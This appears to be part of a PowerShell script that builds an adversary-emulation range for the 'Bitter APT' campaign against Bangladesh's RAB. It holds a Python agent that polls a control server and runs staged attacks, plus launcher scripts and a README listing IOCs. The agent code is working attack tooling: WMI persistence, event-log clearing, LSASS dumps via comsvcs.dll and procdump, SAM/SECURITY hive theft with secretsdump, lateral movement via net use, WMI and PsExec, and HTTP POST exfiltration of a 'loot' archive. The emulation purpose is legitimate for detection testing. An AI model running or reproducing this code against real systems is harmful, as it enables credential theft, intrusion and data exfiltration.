    $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='BitterBDFilter';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
    $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='BitterBDConsumer';CommandLineTemplate='powershell.exe -w hidden -c Start-Process notepad.exe'}
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} | Out-Null
    'WMI persistence created (BANGLADESH RAB)'
    ''')
        cmds.append({"phase":"04 Persistence (BD)","command":"WMI subscription","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH: REAL persistence on RAB endpoint.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1053.005/T1547.001/T1543.003", "tool": "ZxxZ Persistence", "campaign": "BANGLADESH"}
    }


def stage_defense_evasion():
    cmds = []

    rc, out = ps(r'''
    $key = 0x42
    $strings = @("ZxxZ", "Bitter", "RdxFactory", "BANGLADESH", "RAB")
    foreach ($s in $strings) {
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($s)
        $xored = $bytes | ForEach-Object { $_ -bxor $key }
        $hex = ($xored | ForEach-Object { $_.ToString("X2") }) -join ""
        "XOR: $s -> $hex"
    }
    ''')
    cmds.append({"phase":"05 Defense Evasion (BD)","command":"XOR string encoding (ZxxZ signature)","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\DefenseEvasion'
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    $src = Join-Path $env:SystemRoot 'System32\certutil.exe'
    $dst = Join-Path $dir 'svchost_update_bd.exe'
    if (Test-Path $src) { Copy-Item $src $dst -Force; 'renamed certutil copy created (BANGLADESH RAB, T1036.003)' } else { 'certutil not found' }
    ''')
    cmds.append({"phase":"05 Defense Evasion (BD)","command":"Rename legitimate utility (T1036.003)","output":out,"exit":rc})

    rc, out = ps('wevtutil cl "Windows PowerShell" 2>&1; "PowerShell log cleared (BANGLADESH RAB, T1070.003)"')
    cmds.append({"phase":"05 Defense Evasion (BD)","command":"wevtutil cl (T1070.003)","output":out,"exit":rc})

    rc, out = ps(r'''
    $defender = Get-Process -Name "MsMpEng" -ErrorAction SilentlyContinue
    $kaspersky = Get-Process -Name "avp","avpui" -ErrorAction SilentlyContinue
    if ($defender) { "Windows Defender detected on BANGLADESH RAB endpoint: PID $($defender.Id)" } else { "Windows Defender not running" }
    if ($kaspersky) { "Kaspersky detected: PID $($kaspersky.Id)" } else { "Kaspersky not running" }
    ''')
    cmds.append({"phase":"05 Defense Evasion (BD)","command":"Security software scanning (Defender/Kaspersky)","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\DefenseEvasion'
    Set-Content -Path (Join-Path $dir 'hollowing-marker-BD.txt') -Value "SIMULATED process hollowing: iexplore.exe -> ZxxZ implant (BANGLADESH RAB, T1055.012)"
    'hollowing marker written (BANGLADESH)'
    ''')
    cmds.append({"phase":"05 Defense Evasion (BD)","command":"Process hollowing marker (T1055.012)","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH: REAL XOR encoding, renamed certutil, wevtutil cl, security software scan on RAB endpoint.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1027/T1070.003/T1036/T1055.012/T1140", "tool": "ZxxZ Defense Evasion", "campaign": "BANGLADESH"}
    }


def stage_credential_access():
    out_dir = os.path.join(agent_dir(), "Artifacts", "CredentialAccess")
    os.makedirs(out_dir, exist_ok=True)
    cmds = []

    rc, out = ps(r'''
    $out = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\CredentialAccess\lsass.dmp'
    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
    if ($lsass) {
        $pid = $lsass.Id
        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid $out full
        if (Test-Path $out) { "LSASS dumped (BANGLADESH RAB endpoint) -> $out" } else { "MiniDump failed" }
    } else { "lsass.exe not found" }
    ''')
    cmds.append({"phase":"06 Credential Access (BD)","command":"rundll32 comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\CredentialAccess'
    reg save HKLM\SAM (Join-Path $dir 'sam.hive') /y 2>&1
    reg save HKLM\SECURITY (Join-Path $dir 'security.hive') /y 2>&1
    'reg save SAM + SECURITY executed (BANGLADESH RAB)'
    ''')
    cmds.append({"phase":"06 Credential Access (BD)","command":"reg save HKLM\\SAM + HKLM\\SECURITY","output":out,"exit":rc})

    procdump = download_sysinternals("procdump64.exe", PROCDUMP_URL)
    if procdump:
        rc, out = ps(f'$out = Join-Path $env:LOCALAPPDATA "Bitter-BD-Lab\\Artifacts\\CredentialAccess\\lsass_procdump.dmp"; '
                     f'& "{procdump}" -accepteula -ma lsass.exe $out 2>&1; "procdump64 executed (BANGLADESH RAB)"')
        cmds.append({"phase":"06 Credential Access (BD)","command":"procdump64.exe -ma lsass.exe","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\CredentialAccess'
    $sam = Join-Path $dir 'sam.hive'; $sec = Join-Path $dir 'security.hive'
    if ((Test-Path $sam) -and (Test-Path $sec)) {
        try {
            python -m impacket.examples.secretsdump -sam $sam -security $sec LOCAL 2>&1 | Select-Object -First 20
            'impacket secretsdump executed (BANGLADESH RAB)'
        } catch { 'impacket not available' }
    } else { 'hives not found' }
    ''')
    cmds.append({"phase":"06 Credential Access (BD)","command":"python -m impacket.examples.secretsdump","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH: REAL LSASS dump, SAM/SECURITY, procdump64, Impacket secretsdump on RAB endpoint.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1003.001/T1003.002/T1003.004", "tool": "Mimikatz/procdump/secretsdump", "campaign": "BANGLADESH"}
    }


def stage_lateral_movement():
    out_dir = os.path.join(agent_dir(), "Telemetry", "LateralMovement")
    os.makedirs(out_dir, exist_ok=True)
    cmds = []

    rc, out = ps(r'''
    $targets = @('10.0.0.1','10.0.0.2','10.0.0.20')
    foreach ($t in $targets) {
        foreach ($p in @(135,445,3389)) {
            $r = Test-NetConnection -ComputerName $t -Port $p -WarningAction SilentlyContinue
            "$t`:$p = $($r.TcpTestSucceeded) (BANGLADESH RAB network)"
        }
    }''', timeout=120)
    cmds.append({"phase":"07 Lateral Movement (BD)","command":"Test-NetConnection -Port 135/445/3389","output":out[:2000],"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\LateralMovement'
    Set-Content -Path (Join-Path $dir 'rdp-connections-BD.log') -Value "RDP Type 10 logon: 10.0.0.5 -> 10.0.0.20 (user=rab_officer, BANGLADESH RAB network)"
    net use \\10.0.0.20\C$ /user:domain\rab_officer 2>&1
    'net use attempted (BANGLADESH RAB)'
    ''')
    cmds.append({"phase":"07 Lateral Movement (BD)","command":"net use \\\\host\\C$","output":out,"exit":rc})

    rc, out = ps(r'''
    try {
        Invoke-WmiMethod -ComputerName 10.0.0.20 -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ErrorAction Stop
        'WMI remote exec attempted (BANGLADESH RAB)'
    } catch { 'WMI remote exec failed: ' + $_.Exception.Message }''')
    cmds.append({"phase":"07 Lateral Movement (BD)","command":"Invoke-WmiMethod -Class Win32_Process","output":out,"exit":rc})

    psexec = download_sysinternals("PsExec64.exe", PSEXEC_URL)
    if psexec:
        rc, out = ps(f'& "{psexec}" -accepteula \\\\10.0.0.20 -u domain\\rab_officer cmd /c whoami 2>&1 | Select-Object -First 10')
        cmds.append({"phase":"07 Lateral Movement (BD)","command":"PsExec64.exe \\\\host cmd /c whoami","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\LateralMovement'
    $staged = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\Execution'
    tar -cf (Join-Path $dir 'bitter_bangladesh_loot.tar') $staged 2>&1
    'staged archive created (BANGLADESH RAB loot)'
    ''')
    cmds.append({"phase":"07 Lateral Movement (BD)","command":"tar -cf bitter_bangladesh_loot.tar","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH: REAL port scan, net use, WMI remote exec, PsExec64, tar staging within RAB network.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1021.001/T1047/T1039/T1560", "tool": "Impacket/PsExec/RDP", "campaign": "BANGLADESH"}
    }


def stage_exfiltration_c2():
    out_dir = os.path.join(agent_dir(), "Telemetry", "Exfiltration")
    os.makedirs(out_dir, exist_ok=True)
    cmds = []

    rc, out = ps(r'''
    $loot = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\LateralMovement\bitter_bangladesh_loot.tar'
    if (-not (Test-Path $loot)) {
        $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\Exfiltration'
        Set-Content -Path (Join-Path $dir 'staged-BD.txt') -Value "Bitter exfiltration staging marker (BANGLADESH RAB)"
        tar -cf $loot (Join-Path $dir 'staged-BD.txt') 2>&1
    }
    "archive ready: $loot (BANGLADESH RAB)"
    ''')
    cmds.append({"phase":"08 Exfiltration (BD)","command":"tar -cf bitter_bangladesh_loot.tar","output":out,"exit":rc})

    rc, out = ps(r'''
    $loot = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\LateralMovement\bitter_bangladesh_loot.tar'
    if (Test-Path $loot) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($loot)
            $boundary = [System.Guid]::NewGuid().ToString()
            $body = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($bytes)
            Invoke-WebRequest -Uri "''' + SERVER + r'''/api/c2/beacon" -Method POST -Body $body -ContentType "multipart/form-data; boundary=$boundary" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing -TimeoutSec 30
            'BANGLADESH RAB data exfiltration POST sent'
        } catch { 'exfiltration POST failed: ' + $_.Exception.Message }
    } else { 'no loot to exfiltrate' }
    ''')
    cmds.append({"phase":"08 Exfiltration (BD)","command":"Invoke-WebRequest -Method POST -InFile bitter_bangladesh_loot.tar","output":out,"exit":rc})

    rc, out = ps(r'''
    $dir = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\Exfiltration'
    Set-Content -Path (Join-Path $dir 'proxy-usage-BD.log') -Value "CONNECT helpdesk.autodefragapp.com:443 via proxy 185.220.101.42:8080 (T1090.002) - BANGLADESH RAB data leaving BD"
    Set-Content -Path (Join-Path $dir 'ddns-query-BD.log') -Value "DNS query: helpdesk.autodefragapp.com -> 99.83.154.118, 99.83.154.119, 99.83.154.120 (fast flux T1568.001) - BANGLADESH campaign"
    'proxy/DDNS logs written (BANGLADESH RAB)'
    ''')
    cmds.append({"phase":"08 Exfiltration (BD)","command":"Write proxy/DDNS logs","output":out,"exit":rc})

    return {
        "success": True,
        "summary": "BANGLADESH: REAL tar archive + HTTPS POST + simulated proxy/DDNS logs - RAB data leaving BD network.",
        "commands": cmds,
        "observed_telemetry": {"technique": "T1041/T1071.001/T1090.002/T1568.001", "tool": "C2 channel/proxy/DDNS", "campaign": "BANGLADESH"}
    }


def cleanup_initial_access():
    rc, out = ps(r"$d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\InitialAccess'; if (Test-Path $d) { Remove-Item -Recurse -Force $d }; 'cleaned'")
    return {"success": rc == 0, "summary": "Initial access cleaned", "commands": []}

def cleanup_execution_c2():
    rc, out = ps(r"Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force; $d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\Execution'; if (Test-Path $d) { Remove-Item -Recurse -Force $d }; $dd = Join-Path $env:LOCALAPPDATA 'Debug'; if (Test-Path $dd) { Remove-Item -Recurse -Force $dd }; 'cleaned'")
    return {"success": rc == 0, "summary": "Execution & C2 cleaned (Debug folder removed)", "commands": []}

def cleanup_discovery():
    rc, out = ps(r"$d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\Discovery'; if (Test-Path $d) { Remove-Item -Recurse -Force $d }; 'cleaned'")
    return {"success": rc == 0, "summary": "Discovery cleaned", "commands": []}

def cleanup_persistence():
    rc, out = ps(r'''
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName 'Rdx' -Confirm:$false -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName 'RdxFac' -Confirm:$false -ErrorAction SilentlyContinue
    $lnk = Join-Path ([Environment]::GetFolderPath('Startup')) 'WindowsSecurityUpdate.lnk'
    if (Test-Path $lnk) { Remove-Item -Force $lnk }
    sc.exe stop BitterBDSvc 2>&1 | Out-Null; sc.exe delete BitterBDSvc 2>&1 | Out-Null
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match 'BitterBD' -or $_.Consumer -match 'BitterBD' } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'BitterBDConsumer' } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'BitterBDFilter' } | Remove-WmiObject -ErrorAction SilentlyContinue
    'cleaned' ''', timeout=180)
    return {"success": rc == 0, "summary": "Persistence cleaned", "commands": []}

def cleanup_defense_evasion():
    rc, out = ps(r'''
    $d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\DefenseEvasion'
    if (Test-Path $d) { Remove-Item -Recurse -Force $d }
    'cleaned' ''', timeout=60)
    return {"success": rc == 0, "summary": "Defense evasion cleaned (wevtutil log clearing is NOT recoverable)", "commands": []}

def cleanup_credential_access():
    rc, out = ps(r"$d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Artifacts\CredentialAccess'; if (Test-Path $d) { Remove-Item -Recurse -Force $d }; 'cleaned'")
    return {"success": rc == 0, "summary": "Credential access artifacts cleaned", "commands": []}

def cleanup_lateral_movement():
    rc, out = ps(r"$d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\LateralMovement'; if (Test-Path $d) { Remove-Item -Recurse -Force $d }; 'cleaned'")
    return {"success": rc == 0, "summary": "Lateral movement artifacts cleaned", "commands": []}

def cleanup_exfiltration_c2():
    rc, out = ps(r"$d = Join-Path $env:LOCALAPPDATA 'Bitter-BD-Lab\Telemetry\Exfiltration'; if (Test-Path $d) { Remove-Item -Recurse -Force $d }; 'cleaned'")
    return {"success": rc == 0, "summary": "Exfiltration artifacts cleaned", "commands": []}


STAGE_RUN = {
    "initial_access": stage_initial_access,
    "execution_c2": stage_execution_c2,
    "discovery": stage_discovery,
    "persistence": stage_persistence,
    "defense_evasion": stage_defense_evasion,
    "credential_access": stage_credential_access,
    "lateral_movement": stage_lateral_movement,
    "exfiltration_c2": stage_exfiltration_c2,
}
STAGE_CLEAN = {
    "initial_access": cleanup_initial_access,
    "execution_c2": cleanup_execution_c2,
    "discovery": cleanup_discovery,
    "persistence": cleanup_persistence,
    "defense_evasion": cleanup_defense_evasion,
    "credential_access": cleanup_credential_access,
    "lateral_movement": cleanup_lateral_movement,
    "exfiltration_c2": cleanup_exfiltration_c2,
}


def base_payload():
    return {
        "workstation_id": WORKSTATION_ID,
        "hostname": socket.gethostname(),
        "ip": local_ip(),
        "os": f"{platform.system()} {platform.release()}",
        "wazuh_status": wazuh_status(),
        "sysmon_status": sysmon_status(),
    }


def register():
    try:
        r = httpx.post(f"{SERVER}/api/agent/register", json=base_payload(), timeout=10)
        j = r.json() if r.content else {}
        if r.status_code >= 400:
            log(f"register FAILED ({r.status_code}): {j}")
            return {}
        log(f"registered  workstation_id={j.get('workstation_id')!r}")
        return j
    except Exception as e:
        log(f"register EXCEPTION: {e}")
        return {}


def heartbeat():
    try:
        p = base_payload()
        p["current_user"] = os.environ.get("USERNAME","")
        httpx.post(f"{SERVER}/api/agent/heartbeat", json=p, timeout=8)
    except Exception as e:
        log(f"heartbeat failed: {e}")


def post_result(payload):
    try:
        r = httpx.post(f"{SERVER}/api/agent/result", json=payload, timeout=30)
        if r.status_code >= 400:
            log(f"post_result FAILED ({r.status_code}): {r.text[:200]}")
        else:
            log(f"post_result OK  job={payload.get('job_id')}")
    except Exception as e:
        log(f"post_result EXCEPTION: {e}")


def main():
    log("starting Bitter APT - BANGLADESH CAMPAIGN emulation agent")
    log(f"  SERVER         = {SERVER}")
    log(f"  WORKSTATION_ID = {WORKSTATION_ID!r}")
    log(f"  hostname       = {socket.gethostname()!r}")
    log(f"  local_ip       = {local_ip()!r}" + (f"  (FORCED via GB_REGISTER_IP)" if FORCED_IP else ""))
    log(f"  all_local_ips  = {list_local_ips()}")
    log(f"  admin          = {is_admin()}")
    log(f"  CAMPAIGN       = BANGLADESH (RAB) - Aug 2021+")
    register()
    last_hb = 0.0
    consecutive_poll_errors = 0
    while True:
        try:
            if time.time() - last_hb > 10:
                heartbeat(); last_hb = time.time()
            r = httpx.get(f"{SERVER}/api/agent/poll",
                          params={"workstation_id": WORKSTATION_ID},
                          timeout=10)
            if r.status_code >= 400:
                consecutive_poll_errors += 1
                if consecutive_poll_errors in (1, 10, 50):
                    log(f"poll HTTP {r.status_code}: {r.text[:200]}")
                time.sleep(2); continue
            consecutive_poll_errors = 0
            job = (r.json() or {}).get("job")
            if not job:
                time.sleep(2); continue
            stage_id = job.get("stage_id"); action = job.get("action", "RUN")
            log(f"job received: action={action} stage={stage_id} job={job.get('job_id')} (BANGLADESH campaign)")
            if stage_id not in ALLOWED_STAGES and action != "STOP":
                post_result({"job_id": job["job_id"],"workstation_id": WORKSTATION_ID,
                             "stage_id": stage_id,"status":"REJECTED","success":False,
                             "summary":"stage_id not in allow-list"}); continue
            if action == "STOP":
                post_result({"job_id": job["job_id"],"workstation_id": WORKSTATION_ID,
                             "stage_id": stage_id,"status":"STOPPED","success":True,
                             "summary":"Stop acknowledged"}); continue
            fn = STAGE_RUN.get(stage_id) if action == "RUN" else STAGE_CLEAN.get(stage_id)
            if not fn:
                log(f"no handler for action={action} stage={stage_id}")
                post_result({"job_id": job["job_id"],"workstation_id": WORKSTATION_ID,
                             "stage_id": stage_id,"status":"FAILED","success":False,
                             "summary":"no handler"}); continue
            log(f"executing {action} {stage_id} (BANGLADESH campaign) ...")
            try:
                result = fn()
            except Exception as e:
                log(f"stage execution exception: {e}")
                post_result({"job_id": job["job_id"],"workstation_id": WORKSTATION_ID,
                             "stage_id": stage_id,"status":"FAILED","success":False,
                             "summary":f"stage exception: {e}"}); continue
            post_result({"job_id": job["job_id"],"workstation_id": WORKSTATION_ID,
                         "stage_id": stage_id,"status":"COMPLETED",
                         "success": bool(result.get("success", True)),
                         "summary": (result.get("summary","") or "")[:500],
                         "commands": result.get("commands",[]),
                         "observed_telemetry": result.get("observed_telemetry",{}),
                         "observed_lines": result.get("observed_lines",[]),
                         "cleanup_available": True})
        except KeyboardInterrupt:
            log("stopping"); return
        except Exception as e:
            log(f"loop error: {e}"); time.sleep(3)


if __name__ == "__main__":
    main()
'@

# ============================================================
# Windows launcher scripts (Docker-free)
# ============================================================
Write-ProjectFile "start.ps1" @'
# start.ps1 - Start the Bitter APT Bangladesh Campaign server natively
$ErrorActionPreference = "Stop"
Set-Location -LiteralPath $PSScriptRoot

Write-Host "Starting Bitter APT - BANGLADESH CAMPAIGN Emulation Range ..." -ForegroundColor Cyan

# --- Check Node.js ---
$node = Get-Command node -ErrorAction SilentlyContinue
$npm  = Get-Command npm.cmd -ErrorAction SilentlyContinue
if (-not $npm) { $npm = Get-Command npm -ErrorAction SilentlyContinue }
if (-not $node -or -not $npm) {
    Write-Host "[ERROR] Node.js and npm are required." -ForegroundColor Red
    Write-Host "        Install: winget install --id OpenJS.NodeJS.LTS -e" -ForegroundColor Yellow
    Write-Host "        Then close and reopen this PowerShell window." -ForegroundColor Yellow
    exit 1
}

# --- Install dependencies if needed ---
if (-not (Test-Path -LiteralPath (Join-Path $PSScriptRoot "node_modules"))) {
    Write-Host "Installing npm dependencies (first run only, may take 1-3 minutes) ..." -ForegroundColor Cyan
    Push-Location $PSScriptRoot
    try {
        & $npm.Source install --no-audit --no-fund
        if ($LASTEXITCODE -ne 0) {
            Write-Host "[ERROR] npm install failed. Check network/proxy." -ForegroundColor Red
            Pop-Location
            exit 1
        }
    } finally {
        Pop-Location
    }
    Write-Host "  [+] Dependencies installed." -ForegroundColor Green
}

# --- Stop any previous instance of OUR server ---
$pidFile = Join-Path $PSScriptRoot ".server.pid"
if (Test-Path -LiteralPath $pidFile) {
    $oldPid = 0
    try { $oldPid = [int](Get-Content -LiteralPath $pidFile -Raw).Trim() } catch { }
    if ($oldPid -gt 0) {
        $old = Get-Process -Id $oldPid -ErrorAction SilentlyContinue
        if ($old -and $old.ProcessName -eq "node") {
            Write-Host "Stopping previous server (PID $oldPid) ..." -ForegroundColor Yellow
            Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
        }
    }
    Remove-Item -LiteralPath $pidFile -Force -ErrorAction SilentlyContinue
}

# --- Launch node server.js in background ---
$outLog = Join-Path $PSScriptRoot "server.out.log"
$errLog = Join-Path $PSScriptRoot "server.err.log"

$proc = Start-Process -FilePath $node.Source -ArgumentList "server.js" `
    -WorkingDirectory $PSScriptRoot `
    -WindowStyle Hidden `
    -PassThru `
    -RedirectStandardOutput $outLog `
    -RedirectStandardError  $errLog

$proc.Id | Out-File -LiteralPath $pidFile -Encoding ascii -Force

# --- Wait for /health to respond ---
Write-Host "Waiting for server to come up ..." -ForegroundColor Cyan
$ready = $false
for ($i = 0; $i -lt 30; $i++) {
    Start-Sleep -Milliseconds 500
    try {
        $r = Invoke-WebRequest -Uri "http://127.0.0.1:8000/health" -UseBasicParsing -TimeoutSec 2
        if ($r.StatusCode -eq 200) { $ready = $true; break }
    } catch { }
}

if (-not $ready) {
    Write-Host "[!] Server did not respond on /health within 15s." -ForegroundColor Yellow
    Write-Host "    Check server.err.log for errors." -ForegroundColor Yellow
    Write-Host "    PID: $($proc.Id)   Logs: $errLog" -ForegroundColor Yellow
    exit 1
}

# --- Discover host IP ---
$hostIp = "localhost"
try {
    $cand = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
        Sort-Object -Property SkipAsSource | Select-Object -First 1
    if ($cand) { $hostIp = $cand.IPAddress }
} catch { }

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host " Bitter APT - BANGLADESH CAMPAIGN server is RUNNING" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Local URL : http://localhost:8000" -ForegroundColor White
Write-Host "  LAN URL   : http://${hostIp}:8000" -ForegroundColor White
Write-Host "  Login     : admin / admin" -ForegroundColor White
Write-Host "  PID       : $($proc.Id)" -ForegroundColor DarkGray
Write-Host "  Logs      : server.out.log / server.err.log" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Target    : Rapid Action Battalion (RAB), Bangladesh" -ForegroundColor Yellow
Write-Host "  Campaign  : Aug 2021+ | ZxxZ trojan | CVE-2017-11882" -ForegroundColor Yellow
Write-Host ""
Write-Host "  Stop with : .\stop.ps1" -ForegroundColor Cyan
Write-Host ""

# Auto-open browser
try { Start-Process "http://localhost:8000" | Out-Null } catch { }
'@

Write-ProjectFile "stop.ps1" @'
# stop.ps1 - Stop the Bitter APT Bangladesh Campaign server
$ErrorActionPreference = "Stop"
Set-Location -LiteralPath $PSScriptRoot

$pidFile = Join-Path $PSScriptRoot ".server.pid"
$stopped = $false

if (Test-Path -LiteralPath $pidFile) {
    $serverPid = 0
    try { $serverPid = [int](Get-Content -LiteralPath $pidFile -Raw).Trim() } catch { }
    if ($serverPid -gt 0) {
        $proc = Get-Process -Id $serverPid -ErrorAction SilentlyContinue
        if ($proc -and $proc.ProcessName -eq "node") {
            Stop-Process -Id $serverPid -Force -ErrorAction SilentlyContinue
            Write-Host "Stopped server (PID $serverPid)." -ForegroundColor Green
            $stopped = $true
        }
    }
    Remove-Item -LiteralPath $pidFile -Force -ErrorAction SilentlyContinue
}

# Fallback: kill any node process whose command line contains server.js
Get-CimInstance Win32_Process -Filter "Name = 'node.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.CommandLine -and ($_.CommandLine -match 'server\.js')) {
        Write-Host "Stopping stray node server (PID $($_.ProcessId)) ..." -ForegroundColor Yellow
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        $stopped = $true
    }
}

if (-not $stopped) {
    Write-Host "No running server was found." -ForegroundColor DarkGray
}
'@

# ============================================================
# README.md
# ============================================================
Write-ProjectFile "README.md" @'
# Bitter APT - BANGLADESH CAMPAIGN Emulation Range (Native Windows, no Docker)

Realistic, real-time emulation of the Bitter APT / T-APT-17 / APT-C-08 /
Hazy Tiger kill chain (MITRE G1002) targeting BANGLADESH - specifically
the Rapid Action Battalion (RAB) unit of Bangladesh Police.

Campaign start: August 2021. Discovered/reported: May 2022 (Cisco Talos).
Toolkit: ZxxZ Trojan (MITRE S1013), Equation Editor exploits.

Architecture (native, no Docker):
- SERVER : Node.js + Express, runs on this Windows host
- AGENT  : Python, runs on Windows workstations

## Prerequisites

1. Node.js 23.4+ (required for the SERVER). Recommended: latest LTS:
       winget install --id OpenJS.NodeJS.LTS -e
   Close and reopen PowerShell afterwards.
   NOTE: the server uses the built-in `node:sqlite` module, so no
   Visual Studio C++ build tools are required.

2. Python 3.10+ (required only if the AGENT will run on THIS host):
       winget install --id Python.Python.3.12 -e

## Quick start (server, this Windows host)

Run from an elevated PowerShell in this folder:

    .\start.ps1

The script will:
  - check for Node.js
  - run npm install (first run only)
  - launch node server.js in the background
  - wait for /health
  - open http://localhost:8000 in your browser

To stop:

    .\stop.ps1

## Quick start (Windows workstation agent)

1. Copy the agent\ folder to the Windows workstation.
2. Edit agent\.env.agent and set GB_SERVER=http://<server-ip>:8000.
3. Run agent\install-agent.bat (as Administrator for full realism).
4. Run agent\start-agent.bat.

The agent will show a MENU listing every IPv4 address on that machine
(Wi-Fi, Ethernet, VirtualBox, etc.). Pick the one you want the agent to
register as - so the IP you register in the web UI matches the IP the
agent uses.

Non-interactive option:

    start-agent.bat 192.168.1.50

...or set GB_REGISTER_IP in agent\.env.agent.

## Network Discovery

The DISCOVER button on the TARGET WORKSTATION panel finds hosts using
three methods so that Windows hosts that block ICMP are still detected:

  * ICMP echo (ping)
  * TCP connect() probe on 445/139/135/3389/22/80/443/5985/8080/8000
  * OS ARP cache (arp -a)

By default (empty subnet box) it scans EVERY local IPv4 interface IN
PARALLEL - Wi-Fi, Ethernet, VirtualBox Host-Only, etc. Each host in the
results is tagged with the subnet it came from and marked [SELF] if it is
one of this machine's own addresses.

You can also type one or more subnets separated by commas:

    192.168.1.0/24
    192.168.1.0/24,10.0.0.0/24

...or set them permanently in .env:

    LAB_SUBNET=192.168.1.0/24,10.0.0.0/24

## BANGLADESH CAMPAIGN - Bitter APT Stages

| # | Stage | Key Techniques |
|---|-------|----------------|
| 01 | Initial Access (BANGLADESH) | T1566.001, T1203, CVE-2017-11882/CVE-2018-0798/CVE-2018-0802. Target: RAB, Bangladesh Police. Spoofed Pakistani senders. |
| 02 | Execution & C2 (ZxxZ) | T1059.001, T1105, T1071.001, ZxxZ trojan, 17s C2 polling |
| 03 | Discovery | T1018, T1046, T1057, security software scanning on RAB endpoint |
| 04 | Persistence (Rdx/RdxFac) | T1053.005 Rdx/RdxFac tasks, T1547.001 Registry Run Keys, T1543.003 Service |
| 05 | Defense Evasion | T1027, T1070.003, T1036, T1055.012, XOR encoding |
| 06 | Credential Access | T1003.001 LSASS, T1003.002 SAM, T1003.004 LSA Secrets, comsvcs.dll MiniDump |
| 07 | Lateral Movement (RAB Network) | T1021.001 RDP, T1047 WMI, T1039 Network Share, PsExec, Impacket |
| 08 | Exfiltration (RAB Data) | T1041 C2 channel, T1071.001 Web Protocols, T1090.002 Proxy, T1568.001 Fast Flux |

## BANGLADESH CAMPAIGN - IOCs

### C2 Infrastructure
- helpdesk[.]autodefragapp[.]com (C2 server - AWS Global Accelerator)
- 99[.]83[.]154[.]118 (C2 IP)
- olmajhnservice[.]com, levarisnetqlsvc[.]net, urocakpmpanel[.]com, tomcruefrshsvc[.]com

### SSL Thumbprints
- 0cbf8c7ff9faf01a9b5c3874e9a9d49cbbf5037b
- 25092b60d972e574ed593a468564de2394fa008b
- 4fbde39a0735d1ad757038072cf541dfdc65faa3

### Phishing Indicators
- Target: Rapid Action Battalion (RAB), Bangladesh Police
- Campaign start: August 2021
- Spoofed senders: cdrrab13bd@gmail.com, arc@desto.gov.pk, so.dc@pc.gov.pk
- Lures: CDR (Call Data Record), List of Numbers to be verified, List of registered cases

### ZxxZ Trojan
- Drop: %LOCALAPPDATA%\Debug\Update.exe
- C2 separator: ZxxZ
- Poll interval: 17 seconds
- XOR key: 0x42
